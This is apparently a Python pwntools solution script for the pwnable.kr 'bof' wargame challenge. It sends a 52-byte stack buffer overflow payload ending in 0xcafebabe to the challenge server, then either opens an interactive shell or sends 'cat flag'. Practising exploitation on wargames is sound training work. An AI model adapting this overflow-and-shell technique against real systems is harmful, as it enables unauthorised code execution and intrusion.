from pwn import *
r = remote('pwnable.kr' , 9000)
#connect to bof server
bof = 'A' * 52
#for buffer overflow, we need dummy 
#0xdeadbeef | RET | SFP | (?) | overflowme array
#ebp-0x2c  = 44
#ebp+8 = 8
#44+8 = 52
key  = p32(0xcafebabe)
#key value
payload =  bof + key
#make payload
log.info('payload is : ' + payload)
#print payload
r.sendline(payload)
#send payload
n = int(input("[?] if u want interactive shell press 1 , if u want flag press 2\n"))
if n == 1 :
  r.interactive()
        #get interactive shell
elif n == 2 :
        r.sendline("cat flag")
        p = r.recvall(timeout=5).decode()
        print(p)
#get flag
